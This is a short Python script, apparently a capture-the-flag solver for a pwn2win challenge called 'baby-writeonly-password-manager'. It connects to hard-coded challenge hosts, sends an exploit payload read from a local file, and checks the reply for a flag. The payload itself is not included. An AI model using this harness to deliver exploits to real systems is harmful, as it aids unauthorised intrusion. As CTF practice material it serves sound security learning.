#!/usr/bin/python3
import socket



def recvline(s):
    res=b""
    while True:
        b=s.recv(1)
        res+=b
        if b==b"\n":
            break
    return res

def recvall(s):
    res = ""
    while True:
        b=s.recv(1024)
        if not b:
            break
        b = str(b,"utf-8")
        res+=b
        print(b,end="")
    return res



def solve(addr,port="1337"):
    fname = "attacker_short"
    #fname = "monshaw"
    with open(fname,"rb") as f:
        payload = f.read()

    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(50)
        s.connect((ipaddr,int(port)))

        print("[RECIVED]" , recvline(s))
        print("[RECIVED]" , recvline(s))
        s.sendall(bytes("%i\n"%len(payload),"utf-8"))
        print("[RECIVED]" , recvline(s))
        s.sendall(payload)
        res = recvall(s)
        expected = "Flag: k}CTF-"
        if expected in res:
            return 1
        else:
            return 0

    except socket.timeout:
        return -1

if __name__=="__main__":
    ipaddr = "34.134.173.143"
    ipaddr = "baby-writeonly-password-manager.pwn2win.party"
    #ipaddr = "baby-writeonly-password-manager-2.pwn2win.party"
    #ipaddr = "34.69.232.66"
    #ipaddr = "35.193.175.126"
    result = solve(ipaddr,"1337")
    print("[result]",result)


